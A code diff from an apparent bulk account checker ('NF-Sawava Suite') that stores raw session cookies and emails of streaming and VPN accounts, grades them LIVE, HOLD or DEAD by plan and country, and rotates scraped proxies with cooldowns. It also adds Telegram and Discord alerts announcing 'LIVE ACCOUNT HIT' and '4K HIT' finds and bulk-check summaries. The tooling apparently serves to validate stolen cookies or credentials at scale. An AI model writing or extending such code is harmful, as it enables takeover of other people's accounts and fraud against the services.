@@ -1,3 +1,4 @@
+import atexit
 import csv
 import hmac
 import http.server
@@ -5,11 +6,13 @@ import io
 import json
 import logging
 import os
+import queue
 import random
 import re
 import socketserver
 import sqlite3
 import threading
+_recheck_mode = threading.local()
 import time
 import urllib.parse
 import urllib.request
@@ -19,6 +22,8 @@ import concurrent.futures
 import platform
 import requests
 from expressvpn_checker import check_expressvpn_account
+from primevideo_checker import check_primevideo_cookie
+from proxy_auto_scraper import run_auto_scrape, get_scraper_status, start_auto_scraper_thread
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 PORT = int(os.environ.get("PORT", 8080))
@@ -194,7 +199,7 @@ cached_proxies_mtime = 0
 cached_proxies_lock = threading.Lock()
 
 def get_config():
-    defaults = {"api_key": "", "allow_cors_origins": [], "rate_limits": {"checker": 200, "admin": 50}, "security": {"max_body_size_mb": 10}}
+    defaults = {"api_key": "", "allow_cors_origins": [], "rate_limits": {"checker": 200, "admin": 50}, "security": {"max_body_size_mb": 10}, "dashboard_pin": ""}
     if not os.path.exists(CONFIG_FILE):
         return defaults
     try:
@@ -210,13 +215,305 @@ def save_config(cfg):
         json.dump(cfg, f, indent=2)
 
 def get_db():
-    conn = sqlite3.connect(DB_FILE, timeout=30)
+    conn = sqlite3.connect(DB_FILE, timeout=30.0)
+    conn.execute("PRAGMA busy_timeout=30000;")
     conn.execute("PRAGMA journal_mode=WAL;")
+    conn.execute("PRAGMA synchronous=NORMAL;")
     return conn
+
+# ── SQLite Asynchronous Write Queue & Batching Worker ───────────────────────
+db_write_queue = queue.Queue(maxsize=50000)
+_db_writer_stop_event = threading.Event()
+_db_writer_thread = None
+
+def queue_db_write(action, data):
+    """Enqueue an asynchronous, non-blocking DB write task."""
+    try:
+        db_write_queue.put_nowait((action, data, None, None))
+    except queue.Full:
+        logging.error("Database write queue full (50,000 items)! Emergency drop.")
+
+def execute_db_write_sync(action, data, timeout=10.0):
+    """Execute a DB write task synchronously via the dedicated writer thread."""
+    done_event = threading.Event()
+    result_box = {}
+    try:
+        db_write_queue.put((action, data, done_event, result_box), timeout=timeout)
+        if not done_event.wait(timeout=timeout):
+            raise TimeoutError(f"Database write timed out for action '{action}'")
+        if not result_box.get("ok", False):
+            err = result_box.get("error", "Unknown DB error")
+            raise RuntimeError(f"Database write failed: {err}")
+        return result_box.get("result", {})
+    except Exception as e:
+        logging.error(f"Sync DB write error ({action}): {e}")
+        raise
+
+def _process_single_db_task(cursor, conn, task):
+    action, data, done_event, result_box = task
+    try:
+        if action == "save_history":
+            p = data
+            key = p.get("key")
+            raw_cookie = p.get("raw_cookie", "")
+            existing = None
+            if key:
+                cursor.execute('SELECT id, plan, billing, country, token_url FROM history WHERE cookie_key = ? ORDER BY id DESC LIMIT 1', (key,))
+                existing = cursor.fetchone()
+            if not existing and raw_cookie:
+                cursor.execute('SELECT id, plan, billing, country, token_url FROM history WHERE raw_cookie = ? ORDER BY id DESC LIMIT 1', (raw_cookie,))
+                existing = cursor.fetchone()
+
+            if existing:
+                existing_id, ex_plan, ex_billing, ex_country, ex_token = existing
+                final_plan = p["plan"] if p["plan"] else ex_plan
+                final_billing = p["billing"] if p["billing"] else (ex_billing if p["status"] != 'DEAD' else '')
+                final_country = p["country"] if p["country"] else ex_country
+                final_token = p["token_url"] if p["token_url"] else (ex_token if p["status"] in ('LIVE', 'HOLD', 'FREE') else '')
+
+                cursor.execute('''
+                    UPDATE history
+                    SET created_at = ?,
+                        type = ?,
+                        status = ?,
+                        plan = ?,
+                        billing = ?,
+                        country = ?,
+                        route = ?,
+                        token_url = ?,
+                        raw_cookie = ?,
+                        cookie_key = ?,
+                        email = ?
+                    WHERE id = ?
+                ''', (
+                    p["now"], p["entry_type"], p["status"], final_plan, final_billing,
+                    final_country, p["route"], final_token, raw_cookie, key, p["email"],
+                    existing_id
+                ))
+                if key:
+                    cursor.execute('DELETE FROM history WHERE cookie_key = ? AND id != ?', (key, existing_id))
+                logging.info(f"Update history [ID {existing_id}]: [{p['entry_type']}] {p['status']} - Plan: {final_plan} - Country: {final_country}")
+            else:
+                cursor.execute('''
+                    INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie, cookie_key, email)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (
+                    p["now"], p["entry_type"], p["status"], p["plan"], p["billing"], p["country"],
+                    p["route"], p["token_url"], raw_cookie, key, p["email"]
+                ))
+                logging.info(f"Save history: [{p['entry_type']}] {p['status']} - Plan: {p['plan']} - Country: {p['country']}")
+
+        elif action == "update_proxy_state":
+            p = data
+            fc_val = 0 if p["fail_count"] is None else p["fail_count"]
+            sc_val = 0 if p["success_count"] is None else p["success_count"]
+            cu_val = 0.0 if p["cooldown_until"] is None else p["cooldown_until"]
+            cursor.execute("""
+                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested, fail_count, success_count, cooldown_until)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+                ON CONFLICT(proxy_key) DO UPDATE SET
+                    status=excluded.status,
+                    latency=CASE WHEN excluded.latency > 0 THEN excluded.latency ELSE proxy_cache.latency END,
+                    last_tested=excluded.last_tested,
+                    fail_count=CASE WHEN ? IS NOT NULL THEN excluded.fail_count ELSE proxy_cache.fail_count END,
+                    success_count=CASE WHEN ? IS NOT NULL THEN excluded.success_count ELSE proxy_cache.success_count END,
+                    cooldown_until=CASE WHEN ? IS NOT NULL THEN excluded.cooldown_until ELSE proxy_cache.cooldown_until END
+            """, (
+                p["proxy_key"], p["status"], p["latency"], p["now"],
+                fc_val, sc_val, cu_val,
+                p["fail_count"], p["success_count"], p["cooldown_until"]
+            ))
+
+        elif action == "batch_update_proxy_states":
+            items = data.get("items", [])
+            if items:
+                cursor.executemany("""
+                    INSERT INTO proxy_cache (proxy_key, status, latency, last_tested)
+                    VALUES (?, ?, ?, ?)
+                    ON CONFLICT(proxy_key) DO UPDATE SET
+                        status=excluded.status,
+                        latency=excluded.latency,
+                        last_tested=excluded.last_tested
+                """, items)
+
+        elif action == "delete_proxy_cache":
+            keys = data.get("keys", [])
+            batch_size = 500
+            for i in range(0, len(keys), batch_size):
+                chunk = keys[i:i+batch_size]
+                placeholders = ",".join(["?"] * len(chunk))
+                cursor.execute(f"DELETE FROM proxy_cache WHERE proxy_key IN ({placeholders})", chunk)
+
+        elif action == "proxy_cooldown":
+            p = data
+            cursor.execute("""
+                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested, fail_count, cooldown_until)
+                VALUES (?, 'COOLDOWN', 0, ?, 1, ?)
+                ON CONFLICT(proxy_key) DO UPDATE SET
+                    status='COOLDOWN',
+                    fail_count=COALESCE(proxy_cache.fail_count, 0) + 1,
+                    cooldown_until=?,
+                    last_tested=?
+            """, (p["key"], p["now"], p["until"], p["until"], p["now"]))
+
+        elif action == "proxy_success":
+            p = data
+            lat = p.get("latency", 0)
+            cursor.execute("""
+                UPDATE proxy_cache
+                SET status='OK',
+                    latency=CASE WHEN ? > 0 THEN ? ELSE latency END,
+                    success_count=COALESCE(success_count, 0) + 1,
+                    fail_count=0,
+                    cooldown_until=0,
+                    last_tested=?
+                WHERE proxy_key=? OR proxy_key=?
+            """, (lat, lat, p["now"], p["key"], p.get("proxy_url", "")))
+
+        elif action == "touch_api_key":
+            cursor.execute('UPDATE api_keys SET last_used = ? WHERE id = ?', (data["last_used"], data["id"]))
+
+        elif action == "update_history_status":
+            p = data
+            if "created_at" in p:
+                cursor.execute('UPDATE history SET status = ?, created_at = ? WHERE id = ?', (p["status"], p["created_at"], p["id"]))
+            else:
+                cursor.execute('UPDATE history SET status = ? WHERE id = ?', (p["status"], p["id"]))
+
+        elif action == "update_history_token":
+            p = data
+            cursor.execute('UPDATE history SET token_url = ?, created_at = ? WHERE id = ?', (p["token_url"], p["created_at"], p["id"]))
+
+        elif action == "delete_history_id":
+            cursor.execute('DELETE FROM history WHERE id = ?', (data["id"],))
+            if result_box is not None:
+                result_box["result"] = {"deleted": cursor.rowcount}
+                result_box["ok"] = True
+
+        elif action == "clear_history":
+            only_dead = data.get("only_dead", False)
+            if only_dead:
+                cursor.execute('DELETE FROM history WHERE status IN ("DEAD", "ERROR", "BAD", "LOCKED", "PHONE_LOCKED")')
+                logging.info("Deleted only DEAD/ERROR/BAD/LOCKED history records.")
+            else:
+                cursor.execute('DELETE FROM history')
+                logging.info("History database cleared completely.")
+            if result_box is not None:
+                result_box["result"] = {"deleted": cursor.rowcount}
+                result_box["ok"] = True
+
+        elif action == "create_api_key":
+            cursor.execute('INSERT INTO api_keys (key, label, created_at, is_active) VALUES (?, ?, ?, 1)',
+                           (data["key"], data["label"], data["created_at"]))
+            new_id = cursor.lastrowid
+            if result_box is not None:
+                result_box["result"] = {"id": new_id, "key": data["key"], "label": data["label"], "created_at": data["created_at"]}
+                result_box["ok"] = True
+
+        elif action == "revoke_api_key":
+            cursor.execute('UPDATE api_keys SET is_active = 0 WHERE id = ?', (data["id"],))
+            if result_box is not None:
+                result_box["result"] = {"ok": True, "revoked": data["id"]}
+                result_box["ok"] = True
+
+        elif action == "delete_api_key":
+            cursor.execute('DELETE FROM api_keys WHERE id = ?', (data["id"],))
+            if result_box is not None:
+                result_box["result"] = {"ok": True, "deleted": data["id"]}
+                result_box["ok"] = True
+
+        if result_box is not None and "ok" not in result_box:
+            result_box["ok"] = True
+
+    except Exception as ex:
+        if result_box is not None:
+            result_box["ok"] = False
+            result_box["error"] = str(ex)
+        logging.error(f"Error executing DB task '{action}': {ex}")
+        raise
+    finally:
+        if done_event is not None:
+            done_event.set()
+
+def db_writer_worker():
+    writer_conn = None
+    try:
+        writer_conn = sqlite3.connect(DB_FILE, timeout=60.0)
+        writer_conn.execute("PRAGMA journal_mode=WAL;")
+        writer_conn.execute("PRAGMA synchronous=NORMAL;")
+        writer_conn.execute("PRAGMA busy_timeout=60000;")
+        writer_conn.execute("PRAGMA cache_size=10000;")
+        writer_conn.execute("PRAGMA temp_store=MEMORY;")
+        cursor = writer_conn.cursor()
+
+        while not _db_writer_stop_event.is_set() or not db_write_queue.empty():
+            try:
+                try:
+                    first_task = db_write_queue.get(timeout=0.1)
+                except queue.Empty:
+                    continue
+
+                batch = [first_task]
+                while len(batch) < 50:
+                    try:
+                        next_task = db_write_queue.get_nowait()
+                        batch.append(next_task)
+                    except queue.Empty:
+                        break
+
+                for task in batch:
+                    try:
+                        _process_single_db_task(cursor, writer_conn, task)
+                    except Exception as te:
+                        logging.error(f"Error processing db write task: {te}")
+                    finally:
+                        db_write_queue.task_done()
+
+                writer_conn.commit()
+
+            except Exception as e:
+                logging.error(f"DB writer worker loop error: {e}")
+                if writer_conn:
+                    try:
+                        writer_conn.rollback()
+                    except Exception:
+                        pass
+                time.sleep(0.05)
+
+    finally:
+        if writer_conn:
+            try:
+                writer_conn.commit()
+                writer_conn.close()
+            except Exception:
+                pass
+
+def start_db_writer():
+    global _db_writer_thread
+    if _db_writer_thread and _db_writer_thread.is_alive():
+        return
+    _db_writer_stop_event.clear()
+    _db_writer_thread = threading.Thread(target=db_writer_worker, daemon=True, name="DBWriterThread")
+    _db_writer_thread.start()
+    logging.info("SQLite Asynchronous Write Worker started.")
+
+def flush_db_queue(timeout=5.0):
+    """Wait for all pending database writes to finish committing."""
+    try:
+        db_write_queue.join()
+    except Exception as e:
+        logging.error(f"Error flushing DB queue: {e}")
+
+atexit.register(flush_db_queue)
 
 def init_db():
     with db_lock:
-        conn = get_db()
+        conn = sqlite3.connect(DB_FILE, timeout=30.0)
+        conn.execute("PRAGMA journal_mode=WAL;")
+        conn.execute("PRAGMA synchronous=NORMAL;")
+        conn.execute("PRAGMA busy_timeout=30000;")
+        conn.execute("PRAGMA cache_size=10000;")
+        conn.execute("PRAGMA temp_store=MEMORY;")
         c = conn.cursor()
         c.execute('''
             CREATE TABLE IF NOT EXISTS history (
@@ -240,16 +537,37 @@ def init_db():
         if "email" not in cols:
             c.execute("ALTER TABLE history ADD COLUMN email TEXT DEFAULT ''")
         c.execute("CREATE INDEX IF NOT EXISTS idx_history_cookie_key ON history(cookie_key)")
+        c.execute("CREATE INDEX IF NOT EXISTS idx_history_type_status ON history(type, status)")
+        c.execute("CREATE INDEX IF NOT EXISTS idx_history_status ON history(status)")
+        c.execute("CREATE INDEX IF NOT EXISTS idx_history_type ON history(type)")
+        c.execute("CREATE INDEX IF NOT EXISTS idx_history_created_at ON history(created_at DESC)")
+        c.execute("CREATE INDEX IF NOT EXISTS idx_history_email ON history(email)")
 
         c.execute('''
             CREATE TABLE IF NOT EXISTS proxy_cache (
                 proxy_key TEXT PRIMARY KEY,
                 status TEXT,
                 latency INTEGER DEFAULT 0,
-                last_tested REAL DEFAULT 0
+                last_tested REAL DEFAULT 0,
+                fail_count INTEGER DEFAULT 0,
+                success_count INTEGER DEFAULT 0,
+                cooldown_until REAL DEFAULT 0,
+                service_tags TEXT DEFAULT ''
             )
         ''')
+        c.execute("PRAGMA table_info(proxy_cache)")
+        p_cols = [r[1] for r in c.fetchall()]
+        if "fail_count" not in p_cols:
+            c.execute("ALTER TABLE proxy_cache ADD COLUMN fail_count INTEGER DEFAULT 0")
+        if "success_count" not in p_cols:
+            c.execute("ALTER TABLE proxy_cache ADD COLUMN success_count INTEGER DEFAULT 0")
+        if "cooldown_until" not in p_cols:
+            c.execute("ALTER TABLE proxy_cache ADD COLUMN cooldown_until REAL DEFAULT 0")
+        if "service_tags" not in p_cols:
+            c.execute("ALTER TABLE proxy_cache ADD COLUMN service_tags TEXT DEFAULT ''")
         c.execute("CREATE INDEX IF NOT EXISTS idx_proxy_status ON proxy_cache(status)")
+        c.execute("CREATE INDEX IF NOT EXISTS idx_proxy_last_tested ON proxy_cache(last_tested)")
+        c.execute("CREATE INDEX IF NOT EXISTS idx_proxy_cooldown ON proxy_cache(cooldown_until)")
 
         c.execute('''
             CREATE TABLE IF NOT EXISTS api_keys (
@@ -273,194 +591,433 @@ def init_db():
 
         conn.commit()
         conn.close()
+    start_db_writer()
 
 def get_cached_proxy_states():
-    with db_lock:
+    try:
+        conn = get_db()
         try:
-            conn = get_db()
             c = conn.cursor()
-            c.execute("SELECT proxy_key, status, latency, last_tested FROM proxy_cache")
+            c.execute("SELECT proxy_key, status, latency, last_tested, fail_count, success_count, cooldown_until, service_tags FROM proxy_cache")
             rows = c.fetchall()
+        finally:
             conn.close()
-            return {r[0]: {"status": r[1], "latency": r[2], "last_tested": r[3]} for r in rows}
-        except Exception as e:
-            logging.error(f"Error reading proxy_cache: {e}")
-            return {}
+        now = time.time()
+        res = {}
+        for r in rows:
+            k, st, lat, lt = r[0], r[1], r[2], r[3]
+            fc = r[4] or 0
+            sc = r[5] or 0
+            cu = r[6] or 0.0
+            tags = r[7] or ""
+            if cu > now:
+                actual_st = "COOLDOWN"
+            elif st == "COOLDOWN" and cu <= now:
+                actual_st = "OK"
+            else:
+                actual_st = st
+            res[k] = {
+                "status": actual_st,
+                "latency": lat,
+                "last_tested": lt,
+                "fail_count": fc,
+                "success_count": sc,
+                "cooldown_until": cu,
+                "service_tags": tags
+            }
+        return res
+    except Exception as e:
+        logging.error(f"Error reading proxy_cache: {e}")
+        return {}
 
-def update_cached_proxy_state(proxy_key, status, latency=0):
-    if not proxy_key:
+def update_cached_proxy_state(proxy_key, status, latency=0, fail_count=None, success_count=None, cooldown_until=None):
+    if not proxy_key or getattr(_recheck_mode, 'active', False):
         return
-    with db_lock:
-        try:
-            conn = get_db()
-            c = conn.cursor()
-            now = time.time()
-            c.execute("""
-                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested)
-                VALUES (?, ?, ?, ?)
-                ON CONFLICT(proxy_key) DO UPDATE SET
-                    status=excluded.status,
-                    latency=excluded.latency,
-                    last_tested=excluded.last_tested
-            """, (proxy_key, status, latency, now))
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            logging.error(f"Error updating proxy_cache: {e}")
+    now = time.time()
+    queue_db_write("update_proxy_state", {
+        "proxy_key": proxy_key,
+        "status": status,
+        "latency": latency,
+        "now": now,
+        "fail_count": fail_count,
+        "success_count": success_count,
+        "cooldown_until": cooldown_until
+    })
 
 def batch_update_cached_proxy_states(items):
-    if not items:
+    if not items or getattr(_recheck_mode, 'active', False):
         return
-    with db_lock:
-        try:
-            conn = get_db()
-            c = conn.cursor()
-            now = time.time()
-            data = [(k, s, l, now) for (k, s, l) in items if k]
-            c.executemany("""
-                INSERT INTO proxy_cache (proxy_key, status, latency, last_tested)
-                VALUES (?, ?, ?, ?)
-                ON CONFLICT(proxy_key) DO UPDATE SET
-                    status=excluded.status,
-                    latency=excluded.latency,
-                    last_tested=excluded.last_tested
-            """, data)
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            logging.error(f"Error batch updating proxy_cache: {e}")
+    now = time.time()
+    valid_items = [(k, s, l, now) for (k, s, l) in items if k]
+    if valid_items:
+        queue_db_write("batch_update_proxy_states", {
+            "items": valid_items
+        })
 
 def delete_from_proxy_cache(keys):
     if not keys:
         return
-    with db_lock:
+    queue_db_write("delete_proxy_cache", {
+        "keys": list(keys)
+    })
+
+# ═══════════════════════════════════════════════════════════════════════════
+# FASE 3: WEBHOOK NOTIFICATIONS (TELEGRAM & DISCORD) & PROXY PROVIDER SYNC
+# ═══════════════════════════════════════════════════════════════════════════
+def send_telegram_alert(message, parse_mode="HTML"):
+    try:
+        cfg = get_config()
+        tg = cfg.get("notifications", {}).get("telegram", {})
+        if not tg.get("enabled"):
+            return False, "Telegram notifications disabled in settings"
+        bot_token = tg.get("bot_token", "").strip()
+        chat_id = tg.get("chat_id", "").strip()
+        if not bot_token or not chat_id:
+            return False, "Telegram Bot Token or Chat ID not configured"
+
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        payload = json.dumps({
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": parse_mode,
+            "disable_web_page_preview": True
+        }).encode("utf-8")
+
+        req = urllib.request.Request(
+            url,
+            data=payload,
+            headers={"Content-Type": "application/json; charset=utf-8"}
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            return resp.status == 200, "Sent"
+    except Exception as e:
+        logging.error(f"Telegram notification error: {e}")
+        return False, str(e)
+
+def send_discord_alert(title, description, fields=None, color=0x10B981):
+    try:
+        cfg = get_config()
+        dc = cfg.get("notifications", {}).get("discord", {})
+        if not dc.get("enabled"):
+            return False, "Discord notifications disabled in settings"
+        webhook_url = dc.get("webhook_url", "").strip()
+        if not webhook_url:
+            return False, "Discord Webhook URL not configured"
+
+        embed = {
+            "title": title,
+            "description": description,
+            "color": color,
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "footer": {"text": "NF-Sawava Suite Ultra • Alert System"}
+        }
+        if fields:
+            embed["fields"] = fields
+
+        payload = json.dumps({
+            "username": "NF-Sawava Notifier",
+            "embeds": [embed]
+        }).encode("utf-8")
+
+        req = urllib.request.Request(
+            webhook_url,
+            data=payload,
+            headers={"Content-Type": "application/json; charset=utf-8", "User-Agent": "NF-Sawava-Notifier/2.0"}
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            return resp.status in (200, 204), "Sent"
+    except Exception as e:
+        logging.error(f"Discord notification error: {e}")
+        return False, str(e)
+
+def dispatch_live_notification(service, email, plan, country, route=None):
+    def _run():
         try:
-            conn = get_db()
-            c = conn.cursor()
-            k_list = list(keys)
-            batch_size = 500
-            for i in range(0, len(k_list), batch_size):
-                chunk = k_list[i:i+batch_size]
-                placeholders = ",".join(["?"] * len(chunk))
-                c.execute(f"DELETE FROM proxy_cache WHERE proxy_key IN ({placeholders})", chunk)
-            conn.commit()
-            conn.close()
+            cfg = get_config()
+            notifs = cfg.get("notifications", {})
+            tg = notifs.get("telegram", {})
+            dc = notifs.get("discord", {})
+
+            if not (tg.get("enabled") and tg.get("notify_on_live", True)) and not (dc.get("enabled") and dc.get("notify_on_live", True)):
+                return
+
+            masked_email = email
+            if email and "@" in email:
+                u, d = email.split("@", 1)
+                masked_u = (u[:2] + "****" + u[-1:]) if len(u) > 3 else (u[:1] + "***")
+                masked_email = f"{masked_u}@{d}"
+
+            is_4k = bool(plan and ("4K" in plan or "Ultra" in plan or "Premium" in plan))
+            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            # 1. Telegram
+            if tg.get("enabled") and tg.get("notify_on_live", True):
+                badge = "🎬 <b>[ULTRA HD 4K HIT!]</b>" if is_4k else "🎉 <b>[LIVE ACCOUNT HIT!]</b>"
+                msg = (
+                    f"{badge}\n\n"
+                    f"• <b>Layanan:</b> {service.upper()}\n"
+                    f"• <b>Email:</b> <code>{masked_email}</code>\n"
+                    f"• <b>Plan:</b> {plan or '-'}\n"
+                    f"• <b>Negara:</b> {country or '-'}\n"
+                    f"• <b>Route:</b> {route or 'Direct'}\n"
+                    f"• <b>Waktu:</b> {now_str}"
+                )
+                send_telegram_alert(msg)
+
+            # 2. Discord
+            if dc.get("enabled") and dc.get("notify_on_live", True):
+                color = 0xE50914 if is_4k else 0x10B981
+                title = f"🎬 [4K HIT] {service.upper()} Account Live!" if is_4k else f"🎉 {service.upper()} Account Live!"
+                fields = [
+                    {"name": "Service", "value": service.upper(), "inline": True},
+                    {"name": "Plan", "value": plan or "Active", "inline": True},
+                    {"name": "Country", "value": country or "-", "inline": True},
+                    {"name": "Email", "value": f"`{masked_email}`", "inline": True},
+                    {"name": "Route", "value": route or "Direct", "inline": True},
+                    {"name": "Checked At", "value": now_str, "inline": True}
+                ]
+                send_discord_alert(title, "Akun berstatus LIVE berhasil ditemukan oleh NF-Sawava Suite.", fields=fields, color=color)
         except Exception as e:
-            logging.error(f"Error deleting from proxy_cache: {e}")
+            logging.error(f"Error in dispatch_live_notification: {e}")
+
+    threading.Thread(target=_run, daemon=True).start()
+
+def dispatch_bulk_notification(summary):
+    def _run():
+        try:
+            cfg = get_config()
+            notifs = cfg.get("notifications", {})
+            tg = notifs.get("telegram", {})
+            dc = notifs.get("discord", {})
+
+            if not (tg.get("enabled") and tg.get("notify_on_bulk_finish", True)) and not (dc.get("enabled") and dc.get("notify_on_bulk_finish", True)):
+                return
+
+            total = summary.get("total", 0)
+            live = summary.get("live", 0)
+            four_k = summary.get("four_k", 0)
+            hold = summary.get("hold", 0)
+            dead = summary.get("dead", 0)
+            dur = summary.get("duration", "-")
+            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            # 1. Telegram
+            if tg.get("enabled") and tg.get("notify_on_bulk_finish", True):
+                msg = (
+                    f"🏁 <b>[NF-Sawava] Bulk Check Selesai!</b>\n\n"
+                    f"• <b>Total Diperiksa:</b> {total} akun\n"
+                    f"• <b>✅ LIVE:</b> {live} (🎬 4K: {four_k})\n"
+                    f"• <b>⏸ HOLD:</b> {hold}\n"
+                    f"• <b>💀 DEAD:</b> {dead}\n"
+                    f"• <b>Durasi:</b> {dur}\n"
+                    f"• <b>Waktu:</b> {now_str}"
+                )
+                send_telegram_alert(msg)
+
+            # 2. Discord
+            if dc.get("enabled") and dc.get("notify_on_bulk_finish", True):
+                fields = [
+                    {"name": "Total Checked", "value": str(total), "inline": True},
+                    {"name": "✅ LIVE", "value": f"{live} (🎬 {four_k} 4K)", "inline": True},
+                    {"name": "⏸ HOLD", "value": str(hold), "inline": True},
+                    {"name": "💀 DEAD", "value": str(dead), "inline": True},
+                    {"name": "Duration", "value": str(dur), "inline": True},
+                    {"name": "Finished At", "value": now_str, "inline": True}
+                ]
+                send_discord_alert(
+                    "🏁 [Bulk Check Selesai]",
+                    "Proses pengecekan massal telah selesai dijalankan.",
+                    fields=fields,
+                    color=0x3B82F6
+                )
+        except Exception as e:
+            logging.error(f"Error in dispatch_bulk_notification: {e}")
+
+    threading.Thread(target=_run, daemon=True).start()
+
+def sync_provider_proxies():
+    cfg = get_config()
+    provider_cfg = cfg.get("proxy_provider", {})
+    api_url = provider_cfg.get("api_url", "").strip()
+    if not api_url:
+        return {"ok": False, "error": "Provider API URL is not configured"}
+
+    headers = {
+        "User-Agent": "NF-Sawava-Suite/3.0 (Proxy Provider Sync)"
+    }
+    api_key = provider_cfg.get("api_key", "").strip()
+    if api_key:
+        headers["Authorization"] = f"Token {api_key}"
+
+    try:
+        req = urllib.request.Request(api_url, headers=headers)
+        with urllib.request.urlopen(req, timeout=20) as resp:
+            content_type = resp.headers.get("Content-Type", "").lower()
+            raw_body = resp.read().decode("utf-8", errors="ignore")
+
+        new_proxies = []
+        if "application/json" in content_type or raw_body.strip().startswith(("{", "[")):
+            try:
+                data = json.loads(raw_body)
+                if isinstance(data, dict):
+                    results = data.get("results") or data.get("proxies") or data.get("data") or []
+                    for item in results:
+                        if isinstance(item, dict):
+                            host = item.get("proxy_address") or item.get("ip") or item.get("host")
+                            port = item.get("port")
+                            user = item.get("username") or item.get("user")
+                            pwd = item.get("password") or item.get("pass")
+                            if host and port:
+                                if user and pwd:
+                                    new_proxies.append(f"{host}:{port}:{user}:{pwd}")
+                                else:
+                                    new_proxies.append(f"{host}:{port}")
+                elif isinstance(data, list):
+                    for item in data:
+                        if isinstance(item, str):
+                            new_proxies.append(item.strip())
+                        elif isinstance(item, dict):
+                            host = item.get("proxy_address") or item.get("ip") or item.get("host")
+                            port = item.get("port")
+                            user = item.get("username")
+                            pwd = item.get("password")
+                            if host and port:
+                                if user and pwd:
+                                    new_proxies.append(f"{host}:{port}:{user}:{pwd}")
+                                else:
+                                    new_proxies.append(f"{host}:{port}")
+            except Exception as e:
+                logging.debug(f"JSON parse error during provider sync, falling back to text: {e}")
+
+        if not new_proxies:
+            for line in raw_body.splitlines():
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    parsed = parse_single_proxy(line)
+                    if parsed:
+                        new_proxies.append(line)
+
+        if not new_proxies:
+            return {"ok": False, "error": "No valid proxies could be extracted from provider response"}
+
+        existing_lines = set()
+        if os.path.exists(PROXIES_FILE):
+            with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    l = line.strip()
+                    if l:
+                        existing_lines.add(l)
+
+        added_count = 0
+        to_append = []
+        for p in new_proxies:
+            if p not in existing_lines:
+                existing_lines.add(p)
+                to_append.append(p)
+                added_count += 1
+
+        if to_append:
+            with open(PROXIES_FILE, "a", encoding="utf-8") as f:
+                for p in to_append:
+                    f.write(p + "\n")
+
+        load_proxies(force_reload=True)
+
+        provider_cfg["last_sync"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        cfg["proxy_provider"] = provider_cfg
+        save_config(cfg)
+
+        return {
+            "ok": True,
+            "provider": provider_cfg.get("provider_name", "custom"),
+            "fetched": len(new_proxies),
+            "added": added_count,
+            "total": len(existing_lines),
+            "last_sync": provider_cfg["last_sync"]
+        }
+    except Exception as e:
+        logging.error(f"Provider sync error: {e}")
+        return {"ok": False, "error": str(e)}
 
 def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie='', email=''):
-    with db_lock:
-        try:
-            conn = get_db()
-            c = conn.cursor()
-            key = get_cookie_fingerprint(raw_cookie)
-            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-            existing = None
-            if key:
-                c.execute('SELECT id, plan, billing, country, token_url FROM history WHERE cookie_key = ? ORDER BY id DESC LIMIT 1', (key,))
-                existing = c.fetchone()
-            if not existing and raw_cookie:
-                c.execute('SELECT id, plan, billing, country, token_url FROM history WHERE raw_cookie = ? ORDER BY id DESC LIMIT 1', (raw_cookie,))
-                existing = c.fetchone()
-
-            if existing:
-                existing_id, ex_plan, ex_billing, ex_country, ex_token = existing
-                final_plan = plan if plan else ex_plan
-                final_billing = billing if billing else (ex_billing if status != 'DEAD' else '')
-                final_country = country if country else ex_country
-                final_token = token_url if token_url else (ex_token if status in ('LIVE', 'HOLD', 'FREE') else '')
-
-                c.execute('''
-                    UPDATE history
-                    SET created_at = ?,
-                        type = ?,
-                        status = ?,
-                        plan = ?,
-                        billing = ?,
-                        country = ?,
-                        route = ?,
-                        token_url = ?,
-                        raw_cookie = ?,
-                        cookie_key = ?,
-                        email = ?
-                    WHERE id = ?
-                ''', (
-                    now, entry_type, status, final_plan, final_billing,
-                    final_country, route, final_token, raw_cookie, key, email,
-                    existing_id
-                ))
-                if key:
-                    c.execute('DELETE FROM history WHERE cookie_key = ? AND id != ?', (key, existing_id))
-                logging.info(f"Update history [ID {existing_id}]: [{entry_type}] {status} - Plan: {final_plan} - Country: {final_country}")
-            else:
-                c.execute('''
-                    INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie, cookie_key, email)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-                ''', (
-                    now, entry_type, status, plan, billing, country,
-                    route, token_url, raw_cookie, key, email
-                ))
-                logging.info(f"Save history: [{entry_type}] {status} - Plan: {plan} - Country: {country}")
-
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            logging.error(f"Error saving history: {e}")
+    if getattr(_recheck_mode, 'active', False):
+        return  # Skip saving during recheck — recheck_history_item handles its own DB update
+    try:
+        key = get_cookie_fingerprint(raw_cookie)
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        queue_db_write("save_history", {
+            "entry_type": entry_type,
+            "status": status,
+            "plan": plan,
+            "billing": billing,
+            "country": country,
+            "route": route,
+            "token_url": token_url,
+            "raw_cookie": raw_cookie,
+            "key": key,
+            "email": email,
+            "now": now
+        })
+        if status and str(status).upper() == 'LIVE':
+            dispatch_live_notification(entry_type, email, plan, country, route)
+    except Exception as e:
+        logging.error(f"Error enqueuing history save: {e}")
 
 def get_history(limit=50, offset=0, search='', status='', plan='', entry_type=''):
-    with db_lock:
-        conn = get_db()
+    conn = get_db()
+    try:
         c = conn.cursor()
